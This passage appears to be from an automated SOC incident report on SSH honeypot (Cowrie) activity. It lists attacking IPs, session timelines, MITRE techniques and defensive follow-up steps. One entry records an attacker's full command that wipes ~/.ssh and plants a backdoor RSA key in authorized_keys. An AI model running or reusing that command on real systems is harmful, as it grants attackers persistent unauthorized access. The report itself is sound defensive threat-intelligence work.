| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:27` | `cowrie.command.success` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:27` | `cowrie.command.input` |
| `2026-07-16 05:28:28` | `cowrie.log.closed` |
| `2026-07-16 05:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c7c288d1580

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 05:28 |
| **Last Seen** | 2026-07-16 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:28:15` | `cowrie.session.connect` |
| `2026-07-16 05:28:15` | `cowrie.client.version` |
| `2026-07-16 05:28:16` | `cowrie.client.kex` |
| `2026-07-16 05:28:16` | `cowrie.login.success` |
| `2026-07-16 05:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ddfe85bde8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 05:28 |
| **Last Seen** | 2026-07-16 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:28:16` | `cowrie.session.connect` |
| `2026-07-16 05:28:16` | `cowrie.client.version` |
| `2026-07-16 05:28:16` | `cowrie.client.kex` |
| `2026-07-16 05:28:17` | `cowrie.login.success` |
| `2026-07-16 05:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d458302d22e

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]145` |
| **First Seen** | 2026-07-16 05:29 |
| **Last Seen** | 2026-07-16 05:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:29:38` | `cowrie.session.connect` |
| `2026-07-16 05:29:39` | `cowrie.client.version` |
| `2026-07-16 05:29:39` | `cowrie.client.kex` |
| `2026-07-16 05:29:42` | `cowrie.login.success` |
| `2026-07-16 05:29:43` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]145` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e348dbe2c43

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 05:32 |
| **Last Seen** | 2026-07-16 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:32:44` | `cowrie.session.connect` |
| `2026-07-16 05:32:44` | `cowrie.client.version` |
| `2026-07-16 05:32:44` | `cowrie.client.kex` |
| `2026-07-16 05:32:44` | `cowrie.login.success` |
| `2026-07-16 05:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1a1b1ea22e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 05:32 |
| **Last Seen** | 2026-07-16 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:32:44` | `cowrie.session.connect` |
| `2026-07-16 05:32:44` | `cowrie.client.version` |
| `2026-07-16 05:32:44` | `cowrie.client.kex` |
| `2026-07-16 05:32:44` | `cowrie.login.success` |
| `2026-07-16 05:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c584ddd18015

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 05:32 |
| **Last Seen** | 2026-07-16 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:32:47` | `cowrie.session.connect` |
| `2026-07-16 05:32:47` | `cowrie.client.version` |
| `2026-07-16 05:32:47` | `cowrie.client.kex` |
| `2026-07-16 05:32:47` | `cowrie.login.success` |
| `2026-07-16 05:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a3e2c2d0a7e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 05:32 |
| **Last Seen** | 2026-07-16 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:32:47` | `cowrie.session.connect` |
| `2026-07-16 05:32:47` | `cowrie.client.version` |
| `2026-07-16 05:32:47` | `cowrie.client.kex` |
| `2026-07-16 05:32:47` | `cowrie.login.success` |
| `2026-07-16 05:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdbda2df27b7

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-07-16 05:33 |
| **Last Seen** | 2026-07-16 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:33:00` | `cowrie.session.connect` |
| `2026-07-16 05:33:01` | `cowrie.client.version` |
| `2026-07-16 05:33:01` | `cowrie.client.kex` |
| `2026-07-16 05:33:03` | `cowrie.login.success` |
| `2026-07-16 05:33:03` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a8ca4c90d81

| Field | Detail |
|---|---|
| **Source IP** | `116.181.19[.]147` |
| **First Seen** | 2026-07-16 05:34 |
| **Last Seen** | 2026-07-16 05:39 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:34:15` | `cowrie.session.connect` |
| `2026-07-16 05:34:16` | `cowrie.client.version` |
| `2026-07-16 05:34:16` | `cowrie.client.kex` |
| `2026-07-16 05:34:18` | `cowrie.login.success` |
| `2026-07-16 05:34:19` | `cowrie.session.params` |
| `2026-07-16 05:34:19` | `cowrie.command.input` |
| `2026-07-16 05:34:19` | `cowrie.command.failed` |
| `2026-07-16 05:34:19` | `cowrie.log.closed` |
| `2026-07-16 05:34:20` | `cowrie.session.params` |
| `2026-07-16 05:34:20` | `cowrie.command.input` |
| `2026-07-16 05:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.181.19[.]147` to AbuseIPDB if not already reported
- [ ] Block `116.181.19[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3adbdf55ef9f

| Field | Detail |
|---|---|
| **Source IP** | `20.46.45[.]121` |
| **First Seen** | 2026-07-16 05:36 |
| **Last Seen** | 2026-07-16 05:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:36:31` | `cowrie.session.connect` |
| `2026-07-16 05:36:31` | `cowrie.client.version` |
| `2026-07-16 05:36:31` | `cowrie.client.kex` |
| `2026-07-16 05:36:33` | `cowrie.login.success` |
| `2026-07-16 05:36:33` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.46.45[.]121` to AbuseIPDB if not already reported
- [ ] Block `20.46.45[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2573e21b80d7

| Field | Detail |
|---|---|
| **Source IP** | `183.89.208[.]174` |
| **First Seen** | 2026-07-16 05:40 |
| **Last Seen** | 2026-07-16 05:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:40:00` | `cowrie.session.connect` |
| `2026-07-16 05:40:01` | `cowrie.client.version` |
| `2026-07-16 05:40:01` | `cowrie.client.kex` |
| `2026-07-16 05:40:03` | `cowrie.login.success` |
| `2026-07-16 05:40:03` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:40:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.89.208[.]174` to AbuseIPDB if not already reported
- [ ] Block `183.89.208[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b256d4188f5

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 05:42 |
| **Last Seen** | 2026-07-16 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:42:18` | `cowrie.session.connect` |
| `2026-07-16 05:42:18` | `cowrie.client.version` |
| `2026-07-16 05:42:18` | `cowrie.client.kex` |
| `2026-07-16 05:42:18` | `cowrie.login.success` |
| `2026-07-16 05:42:19` | `cowrie.session.params` |
| `2026-07-16 05:42:19` | `cowrie.command.input` |
| `2026-07-16 05:42:19` | `cowrie.log.closed` |
| `2026-07-16 05:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d67544206c3c

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 05:48 |
| **Last Seen** | 2026-07-16 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:48:16` | `cowrie.session.connect` |
| `2026-07-16 05:48:16` | `cowrie.client.version` |
| `2026-07-16 05:48:16` | `cowrie.client.kex` |
| `2026-07-16 05:48:17` | `cowrie.login.success` |
| `2026-07-16 05:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8820f1a3ccf

| Field | Detail |
|---|---|
| **Source IP** | `218.21.243[.]58` |
| **First Seen** | 2026-07-16 05:48 |
| **Last Seen** | 2026-07-16 05:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:48:29` | `cowrie.session.connect` |
| `2026-07-16 05:48:30` | `cowrie.client.version` |
| `2026-07-16 05:48:30` | `cowrie.client.kex` |
| `2026-07-16 05:48:32` | `cowrie.login.success` |
| `2026-07-16 05:48:33` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.243[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.21.243[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe0681298f8

| Field | Detail |
|---|---|
| **Source IP** | `210.245.95[.]11` |
| **First Seen** | 2026-07-16 05:54 |
| **Last Seen** | 2026-07-16 05:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:54:30` | `cowrie.session.connect` |
| `2026-07-16 05:54:31` | `cowrie.client.version` |
| `2026-07-16 05:54:31` | `cowrie.client.kex` |
| `2026-07-16 05:54:33` | `cowrie.login.success` |
| `2026-07-16 05:54:33` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.95[.]11` to AbuseIPDB if not already reported
- [ ] Block `210.245.95[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a61cb697289

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-07-16 05:54 |
| **Last Seen** | 2026-07-16 05:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:54:43` | `cowrie.session.connect` |
| `2026-07-16 05:54:44` | `cowrie.client.version` |
| `2026-07-16 05:54:44` | `cowrie.client.kex` |
| `2026-07-16 05:54:46` | `cowrie.login.success` |
| `2026-07-16 05:54:47` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d717b0fe3453

| Field | Detail |
|---|---|
| **Source IP** | `60.191.58[.]203` |
| **First Seen** | 2026-07-16 05:58 |
| **Last Seen** | 2026-07-16 05:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:58:00` | `cowrie.session.connect` |
| `2026-07-16 05:58:01` | `cowrie.client.version` |
| `2026-07-16 05:58:01` | `cowrie.client.kex` |
| `2026-07-16 05:58:04` | `cowrie.login.success` |
| `2026-07-16 05:58:06` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.191.58[.]203` to AbuseIPDB if not already reported
- [ ] Block `60.191.58[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4d46343d21

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]57` |
| **First Seen** | 2026-07-16 05:58 |
| **Last Seen** | 2026-07-16 05:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 05:58:11` | `cowrie.session.connect` |
| `2026-07-16 05:58:11` | `cowrie.client.version` |
| `2026-07-16 05:58:11` | `cowrie.client.kex` |
| `2026-07-16 05:58:12` | `cowrie.login.success` |
| `2026-07-16 05:58:13` | `cowrie.direct-tcpip.request` |
| `2026-07-16 05:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de076ed25b32

| Field | Detail |
|---|---|
| **Source IP** | `222.190.110[.]210` |
| **First Seen** | 2026-07-16 06:01 |
| **Last Seen** | 2026-07-16 06:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:01:31` | `cowrie.session.connect` |
| `2026-07-16 06:01:32` | `cowrie.client.version` |
| `2026-07-16 06:01:32` | `cowrie.client.kex` |
| `2026-07-16 06:01:35` | `cowrie.login.success` |
| `2026-07-16 06:01:37` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.190.110[.]210` to AbuseIPDB if not already reported
- [ ] Block `222.190.110[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe633ca86ff

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-07-16 06:01 |
| **Last Seen** | 2026-07-16 06:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:01:47` | `cowrie.session.connect` |
| `2026-07-16 06:01:47` | `cowrie.client.version` |
| `2026-07-16 06:01:47` | `cowrie.client.kex` |
| `2026-07-16 06:01:48` | `cowrie.login.success` |
| `2026-07-16 06:01:48` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56caa417ebd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 06:06 |
| **Last Seen** | 2026-07-16 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:06:58` | `cowrie.session.connect` |
| `2026-07-16 06:06:58` | `cowrie.client.version` |
| `2026-07-16 06:06:58` | `cowrie.client.kex` |
| `2026-07-16 06:06:58` | `cowrie.login.success` |
| `2026-07-16 06:06:58` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:06:58` | `cowrie.direct-tcpip.data` |
| `2026-07-16 06:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8873e704f183

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 06:10 |
| **Last Seen** | 2026-07-16 06:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:10:02` | `cowrie.session.connect` |
| `2026-07-16 06:10:02` | `cowrie.client.version` |
| `2026-07-16 06:10:02` | `cowrie.client.kex` |
| `2026-07-16 06:10:03` | `cowrie.login.success` |
| `2026-07-16 06:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d37c0939aa22

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 06:10 |
| **Last Seen** | 2026-07-16 06:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:10:02` | `cowrie.session.connect` |
| `2026-07-16 06:10:02` | `cowrie.client.version` |
| `2026-07-16 06:10:02` | `cowrie.client.kex` |
| `2026-07-16 06:10:03` | `cowrie.login.success` |
| `2026-07-16 06:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ad572d67c7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 06:10 |
| **Last Seen** | 2026-07-16 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:10:10` | `cowrie.session.connect` |
| `2026-07-16 06:10:10` | `cowrie.client.version` |
| `2026-07-16 06:10:10` | `cowrie.client.kex` |
| `2026-07-16 06:10:11` | `cowrie.login.success` |
| `2026-07-16 06:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64435138fe01

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 06:10 |
| **Last Seen** | 2026-07-16 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:10:11` | `cowrie.session.connect` |
| `2026-07-16 06:10:11` | `cowrie.client.version` |
| `2026-07-16 06:10:11` | `cowrie.client.kex` |
| `2026-07-16 06:10:12` | `cowrie.login.success` |
| `2026-07-16 06:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6bf8df33917

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-16 06:14 |
| **Last Seen** | 2026-07-16 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:14:37` | `cowrie.session.connect` |
| `2026-07-16 06:14:37` | `cowrie.client.version` |
| `2026-07-16 06:14:37` | `cowrie.client.kex` |
| `2026-07-16 06:14:38` | `cowrie.login.success` |
| `2026-07-16 06:14:38` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:14:38` | `cowrie.direct-tcpip.ja4` |
| `2026-07-16 06:14:38` | `cowrie.direct-tcpip.data` |
| `2026-07-16 06:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0054600bdc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-16 06:14 |
| **Last Seen** | 2026-07-16 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
